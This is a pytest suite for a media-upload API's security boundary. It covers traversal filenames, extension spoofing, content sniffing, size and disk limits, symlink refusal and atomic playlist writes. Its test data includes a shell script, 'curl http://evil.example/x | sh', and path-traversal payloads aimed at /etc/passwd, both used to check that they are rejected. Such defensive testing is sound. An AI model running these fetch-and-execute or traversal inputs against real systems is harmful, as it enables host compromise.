"""Upload boundary tests.

This is the highest-risk surface in the control plane: the process holds the
Docker socket, so a file-upload flaw is a host compromise. Traversal payloads,
extension spoofing, size and space limits, clobbering and partial writes are
the point of this file.
"""

from __future__ import annotations

import asyncio
import io
import json
import math
import os
import shutil
import struct
import wave
from pathlib import Path

import pytest

from ambient import uploads
from ambient.events import CHANNEL_STATUS
from ambient.media import AUDIO_EXTENSIONS, IMAGE_EXTENSIONS, MediaKind
from ambient.models import AmbientConfig
from ambient.uploads import (
    UploadError,
    UploadTarget,
    check_extension,
    dedup_path,
    publish,
    resolve_destination,
    sanitize_filename,
    sniff_audio,
)
from tests.conftest import AUTH
from tests.test_config import CHANNEL_ENV, CHANNEL_YAML

SHELL_SCRIPT = b"#!/bin/sh\ncurl http://evil.example/x | sh\n"


# --------------------------------------------------------------------------
# Real media bytes — the probes are only meaningful against real containers
# --------------------------------------------------------------------------


def png_bytes(color: tuple[int, int, int] = (24, 88, 160), size: int = 32) -> bytes:
    from PIL import Image

    buffer = io.BytesIO()
    Image.new("RGB", (size, size), color).save(buffer, format="PNG")
    return buffer.getvalue()


def jpeg_bytes(color: tuple[int, int, int] = (200, 120, 40), size: int = 32) -> bytes:
    from PIL import Image

    buffer = io.BytesIO()
    Image.new("RGB", (size, size), color).save(buffer, format="JPEG")
    return buffer.getvalue()


def wav_bytes(frames: int = 800) -> bytes:
    buffer = io.BytesIO()
    with wave.open(buffer, "wb") as handle:
        handle.setnchannels(1)
        handle.setsampwidth(2)
        handle.setframerate(8000)
        handle.writeframes(
            b"".join(struct.pack("<h", int(6000 * math.sin(i / 6))) for i in range(frames))
        )
    return buffer.getvalue()


# --------------------------------------------------------------------------
# Fixtures
# --------------------------------------------------------------------------


@pytest.fixture()
def uploader(api):
    """The API fixture with the free-space floor removed.

    The default reserves 1 GiB, which would make every assertion here depend on
    how full the machine's disk happens to be. The floor itself is tested
    directly against a stubbed `free_bytes`.
    """
    client, state = api
    state.workspace.ambient.uploads.min_free_mb = 0
    return client, state


def send(
    client,
    kind: str,
    files: list[tuple[str, tuple]],
    *,
    target: str = "common",
    on_conflict: str = "reject",
    headers: dict | None = None,
):
    return client.post(
        f"/api/media/{kind}/upload",
        params={"target": target, "on_conflict": on_conflict},
        files=files,
        headers=AUTH if headers is None else headers,
    )


def part(name: str, data: bytes, content_type: str = "application/octet-stream"):
    return ("files", (name, data, content_type))


BOUNDARY = "ambientteststreamboundary"


def multipart_body(parts: list[tuple[str, str | None, bytes]]) -> bytes:
    """A hand-rolled body, for cases httpx will not produce."""
    chunks: list[bytes] = []
    for field, filename, data in parts:
        disposition = f'form-data; name="{field}"'
        if filename is not None:
            disposition += f'; filename="{filename}"'
        chunks.append(
            f"--{BOUNDARY}\r\nContent-Disposition: {disposition}\r\n\r\n".encode() + data + b"\r\n"
        )
    chunks.append(f"--{BOUNDARY}--\r\n".encode())
    return b"".join(chunks)


def leftovers(directory: Path) -> list[str]:
    return [p.name for p in directory.iterdir() if p.name.endswith(".part")]


# --------------------------------------------------------------------------
# 1. Filename sanitization
# --------------------------------------------------------------------------


def test_every_path_component_is_stripped() -> None:
    assert sanitize_filename("sub/dir/song.mp3") == "song.mp3"
    assert sanitize_filename("song.mp3") == "song.mp3"
    assert sanitize_filename("  spaced name.mp3  ") == "spaced name.mp3"


@pytest.mark.parametrize(
    "payload",
    [
        "../evil.mp3",
        "../../../etc/passwd.mp3",
        "..\\..\\evil.mp3",
        "a/b/../../../../evil.mp3",
        "..%2f..%2fevil.mp3",
        "%2e%2e/evil.mp3",
        "%2e%2e%2fevil.mp3",
        "/etc/passwd.mp3",
        "%2fetc%2fpasswd.mp3",
        "C:\\Windows\\evil.mp3",
        "..",
        ".",
        ".hidden.mp3",
        "",
        "   ",
        "evil\x00.mp3",
        "evil\n.mp3",
        "evil\r\n.mp3",
        "a" * 300 + ".mp3",
    ],
)
def test_hostile_filenames_are_rejected(payload: str) -> None:
    with pytest.raises(UploadError) as caught:
        sanitize_filename(payload)
    assert caught.value.error == "invalid_filename"


def test_a_missing_filename_is_rejected() -> None:
    with pytest.raises(UploadError):
        sanitize_filename(None)


def test_the_rejection_detail_cannot_smuggle_control_characters() -> None:
    with pytest.raises(UploadError) as caught:
        sanitize_filename("../\x1b[31mred.mp3")
    assert "\x1b" not in caught.value.detail


# --------------------------------------------------------------------------
# 2. Extension allowlist — exactly the media-selection contract
# --------------------------------------------------------------------------


def test_the_allowlist_matches_the_contract() -> None:
    assert AUDIO_EXTENSIONS == {".mp3", ".flac", ".ogg", ".opus", ".m4a", ".aac", ".wav"}
    assert IMAGE_EXTENSIONS == {".jpg", ".jpeg", ".png", ".webp", ".bmp"}
    for suffix in AUDIO_EXTENSIONS:
        assert check_extension(f"track{suffix}", MediaKind.AUDIO) == suffix
    for suffix in IMAGE_EXTENSIONS:
        assert check_extension(f"slide{suffix}", MediaKind.IMAGE) == suffix
    assert check_extension("SHOUTING.MP3", MediaKind.AUDIO) == ".mp3"


@pytest.mark.parametrize(
    "name, kind",
    [
        ("payload.sh", MediaKind.AUDIO),
        ("payload.exe", MediaKind.AUDIO),
        ("payload", MediaKind.AUDIO),
        ("slide.tiff", MediaKind.IMAGE),
        ("slide.svg", MediaKind.IMAGE),
        ("track.mp3", MediaKind.IMAGE),
        ("slide.png", MediaKind.AUDIO),
    ],
)
def test_extensions_outside_the_allowlist_are_rejected(name: str, kind: MediaKind) -> None:
    with pytest.raises(UploadError) as caught:
        check_extension(name, kind)
    assert caught.value.error == "unsupported_extension"


# --------------------------------------------------------------------------
# 3. Destination confinement
# --------------------------------------------------------------------------


def make_target(root: Path, kind: MediaKind = MediaKind.AUDIO) -> UploadTarget:
    return UploadTarget(name="common", kind=kind, tree_root=root.resolve(), channel=None)


def test_the_destination_is_the_media_folder_and_nothing_else(tmp_path: Path) -> None:
    (tmp_path / "audio").mkdir()
    target = make_target(tmp_path)
    assert resolve_destination(target, "song.mp3") == (tmp_path / "audio" / "song.mp3").resolve()


def test_a_symlinked_media_folder_is_refused(tmp_path: Path) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    tree = tmp_path / "common"
    tree.mkdir()
    os.symlink(outside, tree / "audio")
    with pytest.raises(UploadError) as caught:
        resolve_destination(make_target(tree), "song.mp3")
    assert caught.value.error == "forbidden_target"


def test_a_symlink_at_the_destination_name_is_refused(tmp_path: Path) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "target.mp3").write_bytes(b"x")
    tree = tmp_path / "common"
    (tree / "audio").mkdir(parents=True)
    os.symlink(outside / "target.mp3", tree / "audio" / "song.mp3")
    with pytest.raises(UploadError) as caught:
        resolve_destination(make_target(tree), "song.mp3")
    assert caught.value.error == "forbidden_target"


# --------------------------------------------------------------------------
# 4. Content probing
# --------------------------------------------------------------------------


def test_a_script_is_not_audio_whatever_it_is_called() -> None:
    assert not sniff_audio(SHELL_SCRIPT, ".mp3")
    assert not sniff_audio(SHELL_SCRIPT, ".flac")
    assert not sniff_audio(SHELL_SCRIPT, ".wav")


def test_real_containers_sniff_as_their_extension() -> None:
    assert sniff_audio(wav_bytes()[:32], ".wav")
    assert sniff_audio(b"fLaC" + b"\x00" * 28, ".flac")
    assert sniff_audio(b"OggS" + b"\x00" * 28, ".ogg")
    assert sniff_audio(b"\x00\x00\x00\x20ftypM4A " + b"\x00" * 16, ".m4a")
    assert sniff_audio(b"\xff\xfb\x90\x00" + b"\x00" * 28, ".mp3")
    assert sniff_audio(b"ID3\x04\x00\x00" + b"\x00" * 26, ".mp3")
    # A real WAV under an .mp3 name is still a lie.
    assert not sniff_audio(wav_bytes()[:32], ".mp3")


# --------------------------------------------------------------------------
# 5. Atomic, non-clobbering publish
# --------------------------------------------------------------------------


def test_dedup_never_returns_an_existing_name(tmp_path: Path) -> None:
    target = tmp_path / "song.mp3"
    assert dedup_path(target) == target
    target.write_bytes(b"x")
    assert dedup_path(target).name == "song-2.mp3"
    (tmp_path / "song-2.mp3").write_bytes(b"x")
    assert dedup_path(target).name == "song-3.mp3"


def test_publish_refuses_to_clobber(tmp_path: Path) -> None:
    target = tmp_path / "song.mp3"
    target.write_bytes(b"original")
    tmp = tmp_path / ".song.mp3.part"
    tmp.write_bytes(b"replacement")
    with pytest.raises(UploadError) as caught:
        publish(tmp, target, rename_on_conflict=False)
    assert caught.value.error == "already_exists"
    assert target.read_bytes() == b"original"


def test_publish_is_a_rename_within_the_destination_directory(tmp_path: Path) -> None:
    target = tmp_path / "song.mp3"
    tmp = tmp_path / ".song.mp3.part"
    tmp.write_bytes(b"payload")
    final, renamed = publish(tmp, target, rename_on_conflict=False)
    assert final == target and not renamed
    assert target.read_bytes() == b"payload"
    assert not tmp.exists()


# --------------------------------------------------------------------------
# 6. Limits from ambient.yaml
# --------------------------------------------------------------------------


def test_upload_limits_have_sane_defaults() -> None:
    limits = uploads.UploadLimits.from_config(AmbientConfig())
    assert limits.max_file_bytes == 512 * 1024 * 1024
    assert limits.max_request_bytes == 2048 * 1024 * 1024
    assert limits.max_files == 64
    assert limits.min_free_bytes == 1024 * 1024 * 1024


def test_upload_limits_are_configurable(tmp_path: Path) -> None:
    from ambient.config import load_workspace
    from tests.test_config import make_repo

    root = make_repo(tmp_path)
    (root / "ambient.yaml").write_text(
        "version: 1\nuploads:\n  max_file_mb: 4\n  max_request_mb: 8\n"
        "  max_files: 2\n  min_free_mb: 16\n",
        encoding="utf-8",
    )
    limits = uploads.UploadLimits.from_config(load_workspace(root).ambient)
    assert limits.max_file_bytes == 4 * 1024 * 1024
    assert limits.max_request_bytes == 8 * 1024 * 1024
    assert limits.max_files == 2
    assert limits.min_free_bytes == 16 * 1024 * 1024


def test_a_request_limit_below_the_file_limit_is_a_config_error() -> None:
    with pytest.raises(ValueError, match="max_request_mb"):
        AmbientConfig.model_validate({"uploads": {"max_file_mb": 8, "max_request_mb": 4}})


# --------------------------------------------------------------------------
# 7. The endpoint — happy paths
# --------------------------------------------------------------------------


def test_audio_lands_in_the_common_library(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send(client, "audio", [part("rain loop.wav", wav_bytes(), "text/plain")])
    assert response.status_code == 200
    body = response.json()
    assert body["uploaded"] == 1 and body["failed"] == 0
    assert body["directory"] == "common/audio"
    result = body["results"][0]
    assert result["ok"] and result["path"] == "common/audio/rain loop.wav"
    assert result["error"] is None and result["renamed"] is False
    stored = repo / "common" / "audio" / "rain loop.wav"
    assert stored.read_bytes() == wav_bytes()
    assert leftovers(stored.parent) == []


def test_an_image_lands_with_a_color_profile_beside_its_own_tree(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send(client, "images", [part("forest.png", png_bytes())])
    assert response.status_code == 200
    result = response.json()["results"][0]
    assert result["path"] == "common/images/forest.png"
    assert result["profile"]["dominant"].startswith("#")
    profile = repo / "common" / "profiles" / "forest.json"
    assert json.loads(profile.read_text(encoding="utf-8"))["source"] == "common/images/forest.png"


def test_a_channel_upload_stays_in_that_channel(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send(client, "images", [part("city.jpg", jpeg_bytes())], target="lofi")
    assert response.status_code == 200
    assert response.json()["directory"] == "channels/lofi/images"
    assert (repo / "channels" / "lofi" / "images" / "city.jpg").is_file()
    assert (repo / "channels" / "lofi" / "profiles" / "city.json").is_file()
    assert not (repo / "common" / "images" / "city.jpg").exists()


def test_several_files_in_one_request(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send(
        client,
        "audio",
        [part("one.wav", wav_bytes()), part("two.wav", wav_bytes(600))],
    )
    assert response.status_code == 200
    assert response.json()["uploaded"] == 2
    assert (repo / "common" / "audio" / "one.wav").is_file()
    assert (repo / "common" / "audio" / "two.wav").is_file()


def test_a_path_component_in_the_filename_is_stripped_not_honoured(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send(client, "audio", [part("subdir/nested.wav", wav_bytes())])
    assert response.status_code == 200
    assert response.json()["results"][0]["path"] == "common/audio/nested.wav"
    assert not (repo / "common" / "audio" / "subdir").exists()


# --------------------------------------------------------------------------
# 8. The endpoint — rejections
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "payload",
    [
        "../../../etc/passwd.wav",
        "..%2f..%2fpasswd.wav",
        "%2e%2e%2fpasswd.wav",
        "/etc/passwd.wav",
        "a/b/../../../../passwd.wav",
        "..\\..\\passwd.wav",
        ".hidden.wav",
    ],
)
def test_traversal_filenames_are_rejected_over_http(uploader, repo: Path, payload: str) -> None:
    client, _state = uploader
    response = send(client, "audio", [part(payload, wav_bytes())])
    assert response.status_code == 400
    assert response.json()["results"][0]["error"] == "invalid_filename"
    assert not (repo.parent / "passwd.wav").exists()
    assert not (repo / "passwd.wav").exists()
    assert list((repo / "common" / "audio").iterdir()) == []


def test_content_is_probed_not_the_extension(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send(client, "audio", [part("payload.mp3", SHELL_SCRIPT, "audio/mpeg")])
    assert response.status_code == 400
    result = response.json()["results"][0]
    assert result["error"] == "unsupported_content"
    assert not (repo / "common" / "audio" / "payload.mp3").exists()
    assert leftovers(repo / "common" / "audio") == []


def test_a_wav_wearing_an_mp3_name_is_rejected(uploader) -> None:
    client, _state = uploader
    response = send(client, "audio", [part("liar.mp3", wav_bytes(), "audio/mpeg")])
    assert response.json()["results"][0]["error"] == "unsupported_content"


@pytest.mark.skipif(shutil.which("ffprobe") is None, reason="ffprobe is not installed")
def test_ffprobe_catches_what_the_magic_bytes_cannot(uploader, repo: Path) -> None:
    """An ID3 tag in front of a shell script sniffs as MP3. ffprobe is the answer."""
    client, _state = uploader
    payload = b"ID3\x04\x00\x00\x00\x00\x00\x00" + SHELL_SCRIPT * 8
    assert sniff_audio(payload[:32], ".mp3")
    response = send(client, "audio", [part("tagged.mp3", payload)])
    assert response.json()["results"][0]["error"] == "unsupported_content"
    assert not (repo / "common" / "audio" / "tagged.mp3").exists()


def test_an_image_that_is_not_an_image_is_rejected(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send(client, "images", [part("payload.png", SHELL_SCRIPT, "image/png")])
    assert response.json()["results"][0]["error"] == "unsupported_content"
    assert not (repo / "common" / "images" / "payload.png").exists()


def test_a_png_wearing_a_jpg_name_is_rejected(uploader) -> None:
    client, _state = uploader
    response = send(client, "images", [part("mislabelled.jpg", png_bytes())])
    assert response.json()["results"][0]["error"] == "unsupported_content"


def test_an_extension_outside_the_allowlist_is_rejected(uploader) -> None:
    client, _state = uploader
    response = send(client, "audio", [part("payload.sh", SHELL_SCRIPT, "audio/mpeg")])
    assert response.json()["results"][0]["error"] == "unsupported_extension"


def test_an_empty_file_is_rejected(uploader) -> None:
    client, _state = uploader
    response = send(client, "audio", [part("empty.wav", b"")])
    assert response.json()["results"][0]["error"] == "unsupported_content"


def test_soundboard_upload_is_audio_probed_without_recompiling(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send(client, "soundboard", [part("air-horn.wav", wav_bytes())])

    assert response.status_code == 200
    assert response.json()["kind"] == "soundboard"
    assert response.json()["recompiled"] == []
    assert (repo / "common" / "soundboard" / "air-horn.wav").is_file()


def test_oversize_is_refused_while_the_body_streams(uploader, repo: Path) -> None:
    client, state = uploader
    state.workspace.ambient.uploads.max_file_mb = 1
    payload = wav_bytes() + b"\x00" * (2 * 1024 * 1024)
    response = send(client, "audio", [part("huge.wav", payload)])
    assert response.status_code == 400
    result = response.json()["results"][0]
    assert result["error"] == "file_too_large"
    # Nothing was kept: the write stopped at the limit, it was not buffered.
    assert result["bytes"] == 0
    assert not (repo / "common" / "audio" / "huge.wav").exists()
    assert leftovers(repo / "common" / "audio") == []


def test_a_declared_oversize_request_is_refused_before_the_body(uploader) -> None:
    client, state = uploader
    state.workspace.ambient.uploads.max_file_mb = 1
    state.workspace.ambient.uploads.max_request_mb = 1
    response = send(client, "audio", [part("huge.wav", b"\x00" * (2 * 1024 * 1024))])
    assert response.status_code == 413
    assert response.json()["error"] == "request_too_large"


def test_the_free_space_floor_is_honoured(uploader, repo: Path, monkeypatch) -> None:
    client, state = uploader
    state.workspace.ambient.uploads.min_free_mb = 1
    monkeypatch.setattr(uploads, "free_bytes", lambda _directory: 512 * 1024)
    response = send(client, "audio", [part("rain.wav", wav_bytes())])
    assert response.status_code == 400
    assert response.json()["results"][0]["error"] == "insufficient_space"
    assert not (repo / "common" / "audio" / "rain.wav").exists()


def test_an_existing_name_is_never_clobbered(uploader, repo: Path) -> None:
    client, _state = uploader
    assert send(client, "audio", [part("rain.wav", wav_bytes())]).status_code == 200
    original = (repo / "common" / "audio" / "rain.wav").read_bytes()

    response = send(client, "audio", [part("rain.wav", wav_bytes(1200))])
    assert response.status_code == 400
    assert response.json()["results"][0]["error"] == "already_exists"
    assert (repo / "common" / "audio" / "rain.wav").read_bytes() == original
    assert leftovers(repo / "common" / "audio") == []


def test_a_duplicate_can_be_deduplicated_and_is_reported(uploader, repo: Path) -> None:
    client, _state = uploader
    assert send(client, "audio", [part("rain.wav", wav_bytes())]).status_code == 200
    response = send(
        client, "audio", [part("rain.wav", wav_bytes(1200))], on_conflict="rename"
    )
    assert response.status_code == 200
    result = response.json()["results"][0]
    assert result["renamed"] is True
    assert result["filename"] == "rain-2.wav"
    assert result["path"] == "common/audio/rain-2.wav"
    assert (repo / "common" / "audio" / "rain-2.wav").is_file()


def test_one_bad_file_does_not_fail_the_batch(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send(
        client,
        "audio",
        [
            part("good.wav", wav_bytes()),
            part("../evil.wav", wav_bytes()),
            part("payload.mp3", SHELL_SCRIPT),
            part("also good.wav", wav_bytes(600)),
        ],
    )
    assert response.status_code == 207
    body = response.json()
    assert body["uploaded"] == 2 and body["failed"] == 2
    errors = {r["submitted"]: r["error"] for r in body["results"]}
    assert errors["../evil.wav"] == "invalid_filename"
    assert errors["payload.mp3"] == "unsupported_content"
    assert errors["good.wav"] is None
    assert (repo / "common" / "audio" / "good.wav").is_file()
    assert (repo / "common" / "audio" / "also good.wav").is_file()
    assert leftovers(repo / "common" / "audio") == []


def test_too_many_files_is_refused(uploader) -> None:
    client, state = uploader
    state.workspace.ambient.uploads.max_files = 2
    response = send(client, "audio", [part(f"t{i}.wav", wav_bytes()) for i in range(4)])
    assert response.status_code == 400
    assert response.json()["error"] == "too_many_files"


def test_a_request_with_no_file_parts_is_refused(uploader) -> None:
    client, _state = uploader
    response = client.post(
        "/api/media/audio/upload",
        params={"target": "common"},
        content=multipart_body([("note", None, b"hello")]),
        headers={**AUTH, "content-type": f"multipart/form-data; boundary={BOUNDARY}"},
    )
    assert response.status_code == 400
    assert response.json()["error"] == "no_files"


def test_the_request_total_is_enforced_without_a_content_length(uploader, repo: Path) -> None:
    """A chunked body declares no size, so the limit has to bite mid-stream."""
    client, state = uploader
    state.workspace.ambient.uploads.max_file_mb = 1
    state.workspace.ambient.uploads.max_request_mb = 1
    body = multipart_body(
        [
            ("files", "one.wav", wav_bytes() + b"\x00" * (700 * 1024)),
            ("files", "two.wav", wav_bytes() + b"\x00" * (700 * 1024)),
        ]
    )
    response = client.post(
        "/api/media/audio/upload",
        params={"target": "common"},
        content=iter([body]),
        headers={**AUTH, "content-type": f"multipart/form-data; boundary={BOUNDARY}"},
    )
    assert "content-length" not in response.request.headers
    assert response.status_code == 413
    assert response.json()["error"] == "request_too_large"
    assert list((repo / "common" / "audio").iterdir()) == []


def test_a_non_multipart_body_is_refused(uploader) -> None:
    client, _state = uploader
    response = client.post("/api/media/audio/upload", json={"files": []}, headers=AUTH)
    assert response.status_code == 400
    assert response.json()["error"] == "invalid_request"


# --------------------------------------------------------------------------
# 9. Target validation
# --------------------------------------------------------------------------


def test_an_unknown_channel_is_refused(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send(client, "audio", [part("rain.wav", wav_bytes())], target="nope")
    assert response.status_code == 404
    assert response.json()["error"] == "unknown_channel"
    assert not (repo / "channels" / "nope").exists()


@pytest.mark.parametrize("target", ["../../etc", "..", "lofi/../../etc", "LOFI", "a/b", ""])
def test_a_hostile_channel_name_is_refused(uploader, target: str) -> None:
    client, _state = uploader
    response = send(client, "audio", [part("rain.wav", wav_bytes())], target=target)
    assert response.status_code in (400, 404)
    assert response.json()["error"] in ("invalid_channel_name", "unknown_channel")


def test_an_unknown_kind_is_refused(uploader) -> None:
    client, _state = uploader
    response = send(client, "video", [part("rain.wav", wav_bytes())])
    assert response.status_code == 400
    assert response.json()["error"] == "invalid_request"


def test_upload_requires_a_token(api) -> None:
    client, _state = api
    response = client.post(
        "/api/media/audio/upload", files=[part("rain.wav", wav_bytes())], headers={}
    )
    assert response.status_code == 401


# --------------------------------------------------------------------------
# 10. SSE
#
# Frame order is not part of the contract. A host with a running channel has
# the supervisor publishing `channel.status` into the same queue, so these
# tests seed exactly that and then scan for the frame they care about.
# --------------------------------------------------------------------------


async def _status_first(state) -> None:
    await state.events.publish(CHANNEL_STATUS, {"state": "running"}, channel="lofi")


async def _take(queue) -> str:
    return await asyncio.wait_for(queue.get(), 5.0)


def frame_named(client, subscriber, name: str, limit: int = 20) -> dict:
    """Read frames until the wanted event arrives; fail rather than hang."""
    for _ in range(limit):
        frame = client.portal.call(_take, subscriber.queue)
        head, separator, body = frame.partition("\ndata: ")
        assert separator and frame.endswith("\n\n")
        if head == f"event: {name}":
            return json.loads(body)
    raise AssertionError(f"no {name!r} frame arrived")


def test_an_upload_reaches_a_connected_sse_client(uploader) -> None:
    client, state = uploader
    holder: dict = {}

    async def open_subscription():
        context = state.events.subscribe()
        holder["context"] = context
        return await context.__aenter__()

    subscriber = client.portal.call(open_subscription)
    try:
        client.portal.call(_status_first, state)
        assert send(client, "images", [part("dusk.png", png_bytes())]).status_code == 200
        payload = frame_named(client, subscriber, "media.uploaded")
    finally:
        client.portal.call(holder["context"].__aexit__, None, None, None)

    assert payload == {
        "channel": None,
        "at": payload["at"],
        "target": "common",
        "kind": "images",
        "uploaded": 1,
        "failed": 0,
        "files": ["dusk.png"],
    }
    assert payload["at"].endswith("Z")


def test_a_channel_upload_names_the_channel_in_its_event(uploader) -> None:
    client, state = uploader
    holder: dict = {}

    async def open_subscription():
        context = state.events.subscribe()
        holder["context"] = context
        return await context.__aenter__()

    subscriber = client.portal.call(open_subscription)
    try:
        client.portal.call(_status_first, state)
        assert send(
            client, "audio", [part("rain.wav", wav_bytes())], target="lofi"
        ).status_code == 200
        payload = frame_named(client, subscriber, "media.uploaded")
    finally:
        client.portal.call(holder["context"].__aexit__, None, None, None)

    assert payload["channel"] == "lofi" and payload["target"] == "lofi"


# --------------------------------------------------------------------------
# 11. Directory-watched channels pick uploads up with no further action
# --------------------------------------------------------------------------


def test_an_upload_appears_in_a_folder_mode_channel(uploader, repo: Path) -> None:
    client, _state = uploader
    assert send(
        client, "audio", [part("new track.wav", wav_bytes())], target="lofi"
    ).status_code == 200
    playlist = client.get("/api/channels/lofi/playlist", headers=AUTH).json()
    assert "/media/channel/audio/new track.wav" in playlist["container_paths"]
    assert playlist["tracks"] == []


def make_channel(repo: Path, name: str, *, tracks: str = "[]", slides: str = "[]") -> Path:
    directory = repo / "channels" / name
    (directory / "audio").mkdir(parents=True)
    (directory / "images").mkdir(parents=True)
    (directory / "audio" / f"{name}-own.mp3").write_bytes(b"x")
    (directory / "images" / f"{name}-own.jpg").write_bytes(b"x")
    config = (
        CHANNEL_YAML.replace("name: lofi", f"name: {name}")
        .replace("tracks: []", f"tracks: {tracks}")
        .replace("slides: []", f"slides: {slides}")
    )
    (directory / "config.yaml").write_text(config, encoding="utf-8")
    (directory / ".env").write_text(CHANNEL_ENV.replace("/lofi", f"/{name}"), encoding="utf-8")
    return directory


def test_an_audio_upload_grows_the_playlist_by_exactly_one(uploader, repo: Path) -> None:
    """The generated list is what Liquidsoap reads; the API view is not enough."""
    client, _state = uploader
    playlist = repo / "channels" / "lofi" / "playlist.m3u"
    before = client.get("/api/channels/lofi/playlist", headers=AUTH).json()["container_paths"]

    response = send(client, "audio", [part("new track.wav", wav_bytes())], target="lofi")
    assert response.status_code == 200
    assert response.json()["recompiled"] == ["lofi"]

    lines = playlist.read_text(encoding="utf-8").splitlines()
    assert len(lines) == len(before) + 1
    assert "/media/channel/audio/new track.wav" in lines


def test_an_image_upload_grows_the_images_list(uploader, repo: Path) -> None:
    client, _state = uploader
    images = repo / "channels" / "lofi" / "images.list"
    before = client.get("/api/channels/lofi/images", headers=AUTH).json()["container_paths"]

    response = send(client, "images", [part("dusk.png", png_bytes())], target="lofi")
    assert response.status_code == 200
    assert response.json()["recompiled"] == ["lofi"]

    lines = images.read_text(encoding="utf-8").splitlines()
    assert len(lines) == len(before) + 1
    assert "/media/channel/images/dusk.png" in lines


def test_an_upload_rewrites_only_the_list_of_its_own_kind(uploader, repo: Path) -> None:
    client, _state = uploader
    images = repo / "channels" / "lofi" / "images.list"
    images.write_text("sentinel\n", encoding="utf-8")
    assert send(
        client, "audio", [part("new track.wav", wav_bytes())], target="lofi"
    ).status_code == 200
    assert images.read_text(encoding="utf-8") == "sentinel\n"


def test_a_shared_upload_updates_the_channels_that_draw_from_common(
    uploader, repo: Path
) -> None:
    """`common/` is shared, so one upload has to reach every channel selecting
    from it — and no further. A pinned list is not watched and stays as written;
    folder mode never pulls from `common/` at all, so it is not touched either.
    """
    client, _state = uploader
    (repo / "common" / "audio" / "base.mp3").write_bytes(b"x")
    shared = make_channel(repo, "shared", tracks='["common/audio/**"]')
    pinned = make_channel(repo, "pinned", tracks='["channels/pinned/audio/pinned-own.mp3"]')
    (shared / "playlist.m3u").write_text("stale\n", encoding="utf-8")
    (pinned / "playlist.m3u").write_text("pinned by hand\n", encoding="utf-8")
    lofi_playlist = repo / "channels" / "lofi" / "playlist.m3u"
    lofi_playlist.write_text("folder mode\n", encoding="utf-8")

    response = send(client, "audio", [part("shared.wav", wav_bytes())], target="common")
    assert response.status_code == 200
    assert response.json()["recompiled"] == ["shared"]

    assert (shared / "playlist.m3u").read_text(encoding="utf-8").splitlines() == [
        "/media/common/audio/base.mp3",
        "/media/common/audio/shared.wav",
    ]
    assert (pinned / "playlist.m3u").read_text(encoding="utf-8") == "pinned by hand\n"
    assert lofi_playlist.read_text(encoding="utf-8") == "folder mode\n"


def test_a_fully_rejected_batch_recompiles_nothing(uploader, repo: Path) -> None:
    client, _state = uploader
    playlist = repo / "channels" / "lofi" / "playlist.m3u"
    playlist.write_text("untouched\n", encoding="utf-8")

    response = send(client, "audio", [part("payload.mp3", SHELL_SCRIPT)], target="lofi")
    assert response.status_code == 400
    assert response.json()["recompiled"] == []
    assert playlist.read_text(encoding="utf-8") == "untouched\n"


def test_the_playlist_is_never_observed_partial(
    uploader, repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Liquidsoap watches this exact path, so it must go from whole to whole."""
    client, _state = uploader
    playlist = repo / "channels" / "lofi" / "playlist.m3u"
    original = "/media/channel/audio/01 - a track.m4a\n"
    playlist.write_text(original, encoding="utf-8")

    real_replace = os.replace
    published: list[tuple[Path, str]] = []

    def recording_replace(src, dst):
        if Path(dst) == playlist:
            published.append((Path(src).parent, playlist.read_text(encoding="utf-8")))
        return real_replace(src, dst)

    monkeypatch.setattr(os, "replace", recording_replace)
    assert send(
        client, "audio", [part("new track.wav", wav_bytes())], target="lofi"
    ).status_code == 200
    monkeypatch.undo()

    assert published, "the playlist was never rewritten"
    for source_dir, contents in published:
        assert source_dir == playlist.parent  # same directory, so rename() is atomic
        assert contents == original  # still whole at the instant it was replaced
    assert "new track.wav" in playlist.read_text(encoding="utf-8")
    assert [p.name for p in playlist.parent.iterdir() if p.name.startswith(".playlist")] == []


# --------------------------------------------------------------------------
# 12. The browser's wire format
#
# The UI appends the file part *before* the fields that name the destination,
# so these requests are hand-rolled in that order: anything that reads the
# fields off the front of the body would pass a helper-built body and still
# write to the wrong tree in a real browser.
# --------------------------------------------------------------------------

FORM_ROUTE = "/api/media/upload"


def send_form(
    client,
    *,
    files: list[tuple[str, bytes]],
    kind: str | None = "audio",
    destination: str | None = "common",
    channel: str | None = None,
    route: str = FORM_ROUTE,
    params: dict | None = None,
    headers: dict | None = None,
    extra: list[tuple[str, str]] | None = None,
):
    """One request in the exact part order the operator UI produces."""
    parts: list[tuple[str, str | None, bytes]] = [
        ("files", name, data) for name, data in files
    ]
    for field, value in (
        ("kind", kind),
        ("destination", destination),
        ("channel", channel),
        *(extra or []),
    ):
        if value is not None:
            parts.append((field, None, value.encode()))
    return client.post(
        route,
        params=params or {},
        content=multipart_body(parts),
        headers={
            **(AUTH if headers is None else headers),
            "content-type": f"multipart/form-data; boundary={BOUNDARY}",
        },
    )


def staged(repo: Path) -> list[str]:
    """Whatever the staging directory is still holding."""
    directory = repo / uploads.STAGING_DIRNAME
    return [p.name for p in directory.iterdir()] if directory.is_dir() else []


def test_the_fields_after_the_file_still_choose_the_tree(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send_form(
        client, files=[("rain.wav", wav_bytes())], destination="channel", channel="lofi"
    )
    assert response.status_code == 200
    body = response.json()
    assert body["directory"] == "channels/lofi/audio"
    assert body["destination"] == "channel" and body["channel"] == "lofi"
    assert (repo / "channels" / "lofi" / "audio" / "rain.wav").is_file()
    assert not (repo / "common" / "audio" / "rain.wav").exists()
    assert leftovers(repo / "channels" / "lofi" / "audio") == []
    assert staged(repo) == []


def test_the_kind_route_honours_the_body_destination(uploader, repo: Path) -> None:
    """The UI probes `/api/media/<kind>/upload` first, so it has to agree.

    Reading the tree from the query default here would drop a channel upload
    into the shared library without saying so.
    """
    client, _state = uploader
    response = send_form(
        client,
        files=[("city.jpg", jpeg_bytes())],
        kind="images",
        destination="channel",
        channel="lofi",
        route="/api/media/images/upload",
    )
    assert response.status_code == 200
